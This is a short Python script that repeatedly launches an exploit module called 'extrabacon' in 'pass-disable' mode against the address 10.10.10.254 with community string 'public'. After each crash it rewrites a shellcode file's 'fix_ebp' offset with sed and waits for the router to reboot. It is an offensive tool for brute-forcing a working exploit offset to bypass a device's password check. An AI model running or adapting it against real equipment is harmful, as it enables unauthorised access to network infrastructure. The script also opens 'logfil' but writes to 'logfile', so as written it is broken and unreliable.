# Must rename extrabacon_2.0.py to extrabacon.py to use
import os
import sys
import fileinput
import socket
from time import sleep
from subprocess import Popen
sys.path.append(os.getcwd())
import extrabacon

fix_ebp = 184
old_fix_ebp = 180
logfil = open("test.txt", "w", buffering=0)
while fix_ebp < 256:
    logfile.write("fix_ebp == " + str(fix_ebp) + "\n")
    success = True
    exp = extrabacon.Extrabacon('Extrabacon', '1.1.0.1')
    arguments = ['extrabacon.py', '-q', 'exec', '-t', '10.10.10.254', '-c', 'public', '--mode', 'pass-disable']

    try:
        exp.launch(arguments)

    except socket.timeout:
        logfile.write("[-] Failed\n")
        success = False
        Popen(["sed", "-i", "s/" + str(old_fix_ebp) + "/" + str(fix_ebp) + "/g", "improved/shellcode_9_1(6).py"])
        # 2 minutes 6 seconds
        old_fix_ebp = fix_ebp
        fix_ebp += 4
        logfile.write("Waiting for router to reboot (2 minutes)\n")
        sleep(126)

    if success:
        logfile.write("[+] Success! Fix ebp: " + str(fix_ebp) + "\n")
        break

logfile.close()
